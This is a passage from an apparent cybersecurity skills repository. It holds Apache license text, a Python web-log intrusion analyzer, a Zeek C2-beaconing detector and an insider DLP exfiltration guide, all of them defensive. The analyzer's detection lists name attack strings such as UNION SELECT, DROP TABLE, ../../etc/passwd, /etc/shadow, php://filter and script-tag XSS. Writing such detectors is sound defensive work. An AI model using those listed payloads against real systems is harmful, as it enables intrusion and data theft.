      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/analyzing-web-server-logs-for-intrusion/references/api-reference.md =====
# API Reference: Web Server Log Intrusion Analysis

## Combined Log Format (Apache/Nginx)
```
<ip> <ident> <authuser> [<date>] "<method> <uri> <proto>" <status> <size> "<referer>" "<user-agent>"
```

## Python re Module - Log Parsing
```python
import re
pattern = re.compile(
    r'(?P<ip>\S+) \S+ \S+ \[(?P<time>[^\]]+)\] '
    r'"(?P<method>\S+) (?P<uri>\S+) (?P<proto>[^"]*)" '
    r'(?P<status>\d+) (?P<size>\S+) "(?P<referer>[^"]*)" "(?P<ua>[^"]*)"'
)
match = pattern.match(line)
data = match.groupdict()
```

## GeoIP2 Python Library
```python
import geoip2.database
reader = geoip2.database.Reader("GeoLite2-City.mmdb")
response = reader.city("8.8.8.8")
response.country.name       # "United States"
response.city.name           # "Mountain View"
response.location.latitude   # 37.386
response.location.longitude  # -122.0838
reader.close()
```

## Attack Signature Categories
| Type | Example Pattern | Severity |
|------|----------------|----------|
| SQLi | `UNION SELECT`, `OR 1=1`, `SLEEP()` | Critical |
| LFI | `../../etc/passwd`, `php://filter` | High |
| XSS | `<script>`, `onerror=`, `javascript:` | High |
| Scanner | User-Agent: nikto, sqlmap, gobuster | Medium |
| Brute Force | >50 POST /login from same IP | High |

## Scanner User-Agent Signatures
| Tool | UA Pattern |
|------|-----------|
| Nikto | `Nikto/2.x` |
| sqlmap | `sqlmap/1.x` |
| DirBuster | `DirBuster-1.0` |
| Gobuster | `gobuster/3.x` |
| Wfuzz | `Wfuzz/3.x` |

===== END FILE =====


===== FILE: skills/analyzing-web-server-logs-for-intrusion/scripts/agent.py =====
#!/usr/bin/env python3
"""Web Server Log Intrusion Analyzer - Detects SQLi, LFI, XSS, and scanner activity in access logs."""

import re
import json
import logging
import argparse
from collections import defaultdict
from datetime import datetime

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

COMBINED_LOG_PATTERN = re.compile(
    r'(?P<ip>\S+) \S+ \S+ \[(?P<time>[^\]]+)\] '
    r'"(?P<method>\S+) (?P<uri>\S+) (?P<proto>[^"]*)" '
    r'(?P<status>\d+) (?P<size>\S+) "(?P<referer>[^"]*)" "(?P<ua>[^"]*)"'
)

SQLI_PATTERNS = [
    (r"(?i)(union\s+(all\s+)?select)", "UNION SELECT injection"),
    (r"(?i)(or\s+1\s*=\s*1)", "OR 1=1 tautology"),
    (r"(?i)('\s*or\s*')", "String-based OR injection"),
    (r"(?i)(;\s*drop\s+table)", "DROP TABLE injection"),
    (r"(?i)(sleep\s*\(\d+\))", "Time-based blind SQLi (SLEEP)"),
    (r"(?i)(benchmark\s*\(\d+)", "Time-based blind SQLi (BENCHMARK)"),
    (r"(?i)(0x[0-9a-f]{8,})", "Hex-encoded payload"),
    (r"(?i)(concat\s*\(|group_concat)", "Data extraction function"),
    (r"(?i)(information_schema)", "Schema enumeration"),
    (r"(?i)(load_file\s*\(|into\s+outfile)", "File read/write via SQL"),
]

LFI_PATTERNS = [
    (r"(\.\./){2,}", "Directory traversal"),
    (r"(?i)(/etc/passwd|/etc/shadow)", "Linux password file access"),
    (r"(?i)(/proc/self|/proc/version)", "Proc filesystem access"),
    (r"(?i)(php://filter|php://input|data://)", "PHP stream wrapper"),
    (r"(?i)(c:\\windows|c:/windows)", "Windows path traversal"),
    (r"(%00|%2500)", "Null byte injection"),
]

XSS_PATTERNS = [
    (r"(?i)(<script[^>]*>)", "Script tag injection"),
    (r"(?i)(javascript\s*:)", "JavaScript URI"),
    (r"(?i)(onerror\s*=|onload\s*=|onmouseover\s*=)", "Event handler injection"),
    (r"(?i)(alert\s*\(|prompt\s*\(|confirm\s*\()", "JS dialog function"),
]

SCANNER_UA_PATTERNS = [
    (r"(?i)nikto", "Nikto scanner"),
    (r"(?i)sqlmap", "sqlmap injection tool"),
    (r"(?i)dirbuster", "DirBuster directory scanner"),
    (r"(?i)gobuster", "Gobuster directory scanner"),
    (r"(?i)wfuzz", "Wfuzz web fuzzer"),
    (r"(?i)nmap", "Nmap scripting engine"),
    (r"(?i)masscan", "Masscan port scanner"),
    (r"(?i)zgrab", "ZGrab scanner"),
    (r"(?i)(python-requests|python-urllib|go-http-client)", "Scripted HTTP client"),
]


def parse_log_line(line):
    """Parse a single Combined Log Format line."""
    match = COMBINED_LOG_PATTERN.match(line.strip())
    if not match:
        return None
    d = match.groupdict()
    d["size"] = int(d["size"]) if d["size"] != "-" else 0
    d["status"] = int(d["status"])
    return d


def parse_log_file(log_path):
    """Parse all entries from a web server access log."""
    entries = []
    with open(log_path, "r", errors="ignore") as f:
        for line in f:
            entry = parse_log_line(line)
            if entry:
                entries.append(entry)
    logger.info("Parsed %d log entries from %s", len(entries), log_path)
    return entries


def detect_attacks(entries):
    """Scan log entries for attack signatures."""
    findings = []
    for entry in entries:
        uri = entry["uri"]
        ua = entry["ua"]
        entry_findings = []
        for pattern, desc in SQLI_PATTERNS:
            if re.search(pattern, uri):
                entry_findings.append({"type": "SQLi", "pattern": desc, "severity": "critical"})
        for pattern, desc in LFI_PATTERNS:
            if re.search(pattern, uri):
                entry_findings.append({"type": "LFI", "pattern": desc, "severity": "high"})
        for pattern, desc in XSS_PATTERNS:
            if re.search(pattern, uri):
                entry_findings.append({"type": "XSS", "pattern": desc, "severity": "high"})
        for pattern, desc in SCANNER_UA_PATTERNS:
            if re.search(pattern, ua):
                entry_findings.append({"type": "Scanner", "pattern": desc, "severity": "medium"})
        if entry_findings:
            findings.append({
                "ip": entry["ip"],
                "timestamp": entry["time"],
                "method": entry["method"],
                "uri": entry["uri"][:200],
                "status": entry["status"],
                "user_agent": entry["ua"][:150],
                "attacks": entry_findings,
            })
    logger.info("Detected %d suspicious requests", len(findings))
    return findings


def detect_brute_force(entries, threshold=50, endpoint_patterns=None):
    """Detect brute-force login attempts by IP frequency."""
    if endpoint_patterns is None:
        endpoint_patterns = ["/login", "/wp-login", "/admin/login", "/api/auth", "/signin"]
    ip_post_counts = defaultdict(int)
    for entry in entries:
        if entry["method"] == "POST":
            if any(ep in entry["uri"].lower() for ep in endpoint_patterns):
                ip_post_counts[entry["ip"]] += 1
    brute_force = []
    for ip, count in ip_post_counts.items():
        if count >= threshold:
            brute_force.append({"ip": ip, "post_count": count, "severity": "high"})
            logger.warning("Brute force: %s sent %d POST requests to login endpoints", ip, count)
    return brute_force


def enrich_with_geoip(findings, geoip_db_path):
    """Enrich findings with GeoIP location data."""
    try:
        import geoip2.database
        reader = geoip2.database.Reader(geoip_db_path)
        for finding in findings:
            try:
                response = reader.city(finding["ip"])
                finding["geo"] = {
                    "country": response.country.name,
                    "city": response.city.name,
                    "latitude": response.location.latitude,
                    "longitude": response.location.longitude,
                }
            except Exception:
                finding["geo"] = None
        reader.close()
    except ImportError:
        logger.warning("geoip2 not installed, skipping GeoIP enrichment")
    return findings


def summarize_attackers(findings):
    """Aggregate findings by source IP for attacker profiling."""
    ip_summary = defaultdict(lambda: {"attacks": defaultdict(int), "total": 0, "uris": set()})
    for f in findings:
        ip = f["ip"]
        ip_summary[ip]["total"] += 1
        ip_summary[ip]["uris"].add(f["uri"][:100])
        for attack in f["attacks"]:
            ip_summary[ip]["attacks"][attack["type"]] += 1
    result = []
    for ip, data in sorted(ip_summary.items(), key=lambda x: x[1]["total"], reverse=True):
        result.append({
            "ip": ip,
            "total_hits": data["total"],
            "attack_types": dict(data["attacks"]),
            "unique_uris": len(data["uris"]),
        })
    return result[:50]


def generate_report(entries, findings, brute_force, attacker_summary):
    """Generate web intrusion detection report."""
    attack_counts = defaultdict(int)
    for f in findings:
        for a in f["attacks"]:
            attack_counts[a["type"]] += 1
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "total_log_entries": len(entries),
        "suspicious_requests": len(findings),
        "brute_force_sources": len(brute_force),
        "attack_breakdown": dict(attack_counts),
        "top_attackers": attacker_summary[:20],
        "brute_force_details": brute_force,
        "sample_findings": findings[:30],
    }
    print(f"WEB LOG ANALYSIS: {len(findings)} suspicious, {len(brute_force)} brute force sources")
    return report


def main():
    parser = argparse.ArgumentParser(description="Web Server Log Intrusion Analyzer")
    parser.add_argument("--log-file", required=True, help="Path to access log file")
    parser.add_argument("--geoip-db", help="Path to GeoLite2-City.mmdb")
    parser.add_argument("--brute-threshold", type=int, default=50)
    parser.add_argument("--output", default="web_intrusion_report.json")
    args = parser.parse_args()

    entries = parse_log_file(args.log_file)
    findings = detect_attacks(entries)
    brute_force = detect_brute_force(entries, args.brute_threshold)
    if args.geoip_db:
        findings = enrich_with_geoip(findings, args.geoip_db)
    attacker_summary = summarize_attackers(findings)
    report = generate_report(entries, findings, brute_force, attacker_summary)

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/detecting-beaconing-patterns-with-zeek/SKILL.md =====
---
name: detecting-beaconing-patterns-with-zeek
description: 'Performs statistical analysis of Zeek conn.log connection intervals
  to detect C2 beaconing patterns. Uses the ZAT library to load Zeek logs into Pandas
  DataFrames, calculates inter-arrival time standard deviation, and flags periodic
  connections with low jitter. Use when hunting for command-and-control callbacks
  in network data.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- network-security
- zeek
- c2-beaconing
- conn-log-analysis
- zat
- threat-hunting
- statistical-analysis
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1071.001
- T1071.004
- T1573
- T1008
- T1095
---

# Detecting Beaconing Patterns with Zeek


## When to Use

- When investigating security incidents that require detecting beaconing patterns with zeek
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Load Zeek conn.log data using ZAT (Zeek Analysis Tools), group connections by
source/destination pairs, and compute timing statistics to identify beaconing.

```python
from zat.log_to_dataframe import LogToDataFrame
import numpy as np

log_to_df = LogToDataFrame()
conn_df = log_to_df.create_dataframe('/path/to/conn.log')

# Group by src/dst pair and calculate inter-arrival time
for (src, dst), group in conn_df.groupby(['id.orig_h', 'id.resp_h']):
    times = group['ts'].sort_values()
    intervals = times.diff().dt.total_seconds().dropna()
    if len(intervals) > 10:
        std_dev = np.std(intervals)
        mean_interval = np.mean(intervals)
        # Low std_dev relative to mean = likely beaconing
```

Key analysis steps:
1. Parse Zeek conn.log into DataFrame with ZAT LogToDataFrame
2. Group connections by source IP and destination IP pairs
3. Calculate inter-arrival time intervals between consecutive connections
4. Compute standard deviation and coefficient of variation
5. Flag pairs with low coefficient of variation as potential beacons

## Examples

```python
from zat.log_to_dataframe import LogToDataFrame
log_to_df = LogToDataFrame()
df = log_to_df.create_dataframe('conn.log')
print(df[['id.orig_h', 'id.resp_h', 'ts', 'duration']].head())
```

===== END FILE =====


===== FILE: skills/detecting-beaconing-patterns-with-zeek/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/detecting-beaconing-patterns-with-zeek/references/api-reference.md =====
# API Reference: Detecting Beaconing Patterns with Zeek

## ZAT (Zeek Analysis Tools)

```python
from zat.log_to_dataframe import LogToDataFrame
from zat import zeek_log_reader
from zat.utils import dataframe_to_matrix

# Load conn.log into DataFrame
log_to_df = LogToDataFrame()
conn_df = log_to_df.create_dataframe('/path/to/conn.log')

# Select specific columns
conn_df = log_to_df.create_dataframe('conn.log',
    usecols=['id.orig_h', 'id.resp_h', 'id.resp_p', 'ts', 'duration'])

# Read rows as dicts (streaming)
reader = zeek_log_reader.ZeekLogReader('conn.log')
for row in reader.readrows():
    print(row)

# Tail mode (live monitoring)
reader = zeek_log_reader.ZeekLogReader('conn.log', tail=True)
for row in reader.readrows():
    process(row)

# Convert to matrix for ML
to_matrix = dataframe_to_matrix.DataFrameToMatrix()
matrix = to_matrix.fit_transform(conn_df[features])
```

## Beaconing Detection Math

```python
import numpy as np

intervals = times.diff().dt.total_seconds().dropna().values
std_dev = np.std(intervals)
mean_val = np.mean(intervals)
cv = std_dev / mean_val  # Coefficient of Variation
# cv < 0.3 = likely beacon (low jitter relative to interval)
```

## Key Zeek Log Fields

| Log | Key Fields |
|-----|-----------|
| conn.log | `id.orig_h`, `id.resp_h`, `id.resp_p`, `ts`, `duration`, `orig_bytes` |
| dns.log | `id.orig_h`, `query`, `qtype_name`, `answers`, `ts` |
| ssl.log | `id.orig_h`, `server_name`, `ja3`, `ja3s`, `ts` |

## Anomaly Detection with ZAT + scikit-learn

```python
from sklearn.ensemble import IsolationForest
odd_clf = IsolationForest(contamination=0.35)
odd_clf.fit(zeek_matrix)
anomalies = conn_df[odd_clf.predict(zeek_matrix) == -1]
```

### References

- ZAT: https://github.com/SuperCowPowers/zat
- ZAT examples: https://supercowpowers.github.io/zat/examples.html
- zat on PyPI: https://pypi.org/project/zat/

===== END FILE =====


===== FILE: skills/detecting-beaconing-patterns-with-zeek/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for detecting C2 beaconing patterns in Zeek conn.log data."""

import json
import argparse
from datetime import datetime

import numpy as np
import pandas as pd
from zat.log_to_dataframe import LogToDataFrame


def load_conn_log(log_path):
    """Load Zeek conn.log into a Pandas DataFrame using ZAT."""
    log_to_df = LogToDataFrame()
    df = log_to_df.create_dataframe(log_path)
    return df


def calculate_beacon_score(intervals):
    """Calculate a beacon score based on interval regularity."""
    if len(intervals) < 5:
        return 0.0
    std_dev = np.std(intervals)
    mean_val = np.mean(intervals)
    if mean_val == 0:
        return 0.0
    cv = std_dev / mean_val
    score = max(0, 1.0 - cv) * 100
    return round(score, 2)


def detect_beaconing(conn_df, min_connections=10, max_cv=0.3):
    """Detect beaconing by analyzing connection interval regularity."""
    conn_df = conn_df.sort_values("ts")
    beacons = []
    grouped = conn_df.groupby(["id.orig_h", "id.resp_h", "id.resp_p"])
    for (src, dst, port), group in grouped:
        if len(group) < min_connections:
            continue
        times = group["ts"].sort_values()
        intervals = times.diff().dt.total_seconds().dropna().values
        if len(intervals) < 5:
            continue
        std_dev = float(np.std(intervals))
        mean_interval = float(np.mean(intervals))
        if mean_interval == 0:
            continue
        cv = std_dev / mean_interval
        beacon_score = calculate_beacon_score(intervals)
        if cv <= max_cv:
            beacons.append({
                "src_ip": src,
                "dst_ip": dst,
                "dst_port": int(port) if not pd.isna(port) else 0,
                "connection_count": len(group),
                "mean_interval_sec": round(mean_interval, 2),
                "std_dev_sec": round(std_dev, 2),
                "coefficient_of_variation": round(cv, 4),
                "beacon_score": beacon_score,
                "first_seen": str(times.iloc[0]),
                "last_seen": str(times.iloc[-1]),
            })
    return sorted(beacons, key=lambda x: x["beacon_score"], reverse=True)


def detect_jitter_beaconing(conn_df, base_interval=60, jitter_pct=0.2, min_conns=10):
    """Detect beaconing with expected interval and jitter tolerance."""
    conn_df = conn_df.sort_values("ts")
    matches = []
    grouped = conn_df.groupby(["id.orig_h", "id.resp_h"])
    for (src, dst), group in grouped:
        if len(group) < min_conns:
            continue
        times = group["ts"].sort_values()
        intervals = times.diff().dt.total_seconds().dropna().values
        lower = base_interval * (1 - jitter_pct)
        upper = base_interval * (1 + jitter_pct)
        matching = np.sum((intervals >= lower) & (intervals <= upper))
        match_pct = matching / len(intervals)
        if match_pct > 0.7:
            matches.append({
                "src_ip": src,
                "dst_ip": dst,
                "connections": len(group),
                "matching_intervals": int(matching),
                "match_percentage": round(match_pct * 100, 1),
                "expected_interval": base_interval,
            })
    return matches


def analyze_dns_beaconing(dns_log_path, min_queries=20, max_cv=0.25):
    """Analyze Zeek dns.log for DNS-based beaconing patterns."""
    log_to_df = LogToDataFrame()
    dns_df = log_to_df.create_dataframe(dns_log_path)
    dns_df = dns_df.sort_values("ts")
    beacons = []
    grouped = dns_df.groupby(["id.orig_h", "query"])
    for (src, query), group in grouped:
        if len(group) < min_queries:
            continue
        times = group["ts"].sort_values()
        intervals = times.diff().dt.total_seconds().dropna().values
        if len(intervals) < 5:
            continue
        std_dev = float(np.std(intervals))
        mean_val = float(np.mean(intervals))
        if mean_val == 0:
            continue
        cv = std_dev / mean_val
        if cv <= max_cv:
            beacons.append({
                "src_ip": src,
                "query": query,
                "query_count": len(group),
                "mean_interval_sec": round(mean_val, 2),
                "std_dev_sec": round(std_dev, 2),
                "cv": round(cv, 4),
                "beacon_score": calculate_beacon_score(intervals),
            })
    return sorted(beacons, key=lambda x: x["beacon_score"], reverse=True)


def filter_whitelisted(beacons, whitelist_domains=None):
    """Remove known-good destinations from beacon results."""
    if not whitelist_domains:
        whitelist_domains = ["microsoft.com", "google.com", "amazonaws.com",
                            "cloudflare.com", "akamai.net"]
    filtered = []
    for b in beacons:
        dst = b.get("dst_ip", "") or b.get("query", "")
        if not any(w in dst for w in whitelist_domains):
            filtered.append(b)
    return filtered


def main():
    parser = argparse.ArgumentParser(description="Zeek Beaconing Detection Agent")
    parser.add_argument("--conn-log", help="Path to Zeek conn.log")
    parser.add_argument("--dns-log", help="Path to Zeek dns.log")
    parser.add_argument("--min-connections", type=int, default=10)
    parser.add_argument("--max-cv", type=float, default=0.3)
    parser.add_argument("--output", default="beacon_report.json")
    parser.add_argument("--action", choices=[
        "conn_beacon", "dns_beacon", "full_hunt"
    ], default="full_hunt")
    args = parser.parse_args()

    report = {"generated_at": datetime.utcnow().isoformat(), "findings": {}}

    if args.action in ("conn_beacon", "full_hunt") and args.conn_log:
        conn_df = load_conn_log(args.conn_log)
        beacons = detect_beaconing(conn_df, args.min_connections, args.max_cv)
        beacons = filter_whitelisted(beacons)
        report["findings"]["conn_beacons"] = beacons
        print(f"[+] Connection beacons detected: {len(beacons)}")

    if args.action in ("dns_beacon", "full_hunt") and args.dns_log:
        dns_beacons = analyze_dns_beaconing(args.dns_log, args.min_connections)
        dns_beacons = filter_whitelisted(dns_beacons)
        report["findings"]["dns_beacons"] = dns_beacons
        print(f"[+] DNS beacons detected: {len(dns_beacons)}")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/detecting-insider-data-exfiltration-via-dlp/SKILL.md =====
---
name: detecting-insider-data-exfiltration-via-dlp
description: 'Detects insider data exfiltration by analyzing DLP policy violations,
  file access patterns, upload volume anomalies, and off-hours activity in endpoint
  and cloud logs. Uses pandas for behavioral analytics and statistical baselines.
  Use when investigating insider threats or building user behavior analytics for data
  loss prevention.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- insider-threat
- data-loss-prevention
- dlp
- exfiltration-detection
- ueba
- security-operations
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1048
- T1041
---

# Detecting Insider Data Exfiltration via DLP


## When to Use

- When investigating security incidents that require detecting insider data exfiltration via dlp
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Analyze endpoint activity logs, cloud storage access, and email DLP events to detect
data exfiltration patterns using behavioral baselines and statistical anomaly detection.

```python
import pandas as pd

df = pd.read_csv("file_activity.csv", parse_dates=["timestamp"])
# Baseline: average daily upload volume per user
baseline = df.groupby(["user", df["timestamp"].dt.date])["bytes_transferred"].sum()
user_avg = baseline.groupby("user").mean()

# Alert on users exceeding 3x their baseline
today = df[df["timestamp"].dt.date == pd.Timestamp.today().date()]
today_totals = today.groupby("user")["bytes_transferred"].sum()
anomalies = today_totals[today_totals > user_avg * 3]
```

Key indicators:
1. Upload volume exceeding 3x daily baseline
2. Access to files outside normal scope
3. Bulk downloads before resignation
4. Off-hours file access patterns
5. USB/external device usage spikes

## Examples

```python
# Detect off-hours activity
df["hour"] = df["timestamp"].dt.hour
off_hours = df[(df["hour"] < 6) | (df["hour"] > 22)]
suspicious = off_hours.groupby("user").size().sort_values(ascending=False)
```

===== END FILE =====


===== FILE: skills/detecting-insider-data-exfiltration-via-dlp/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
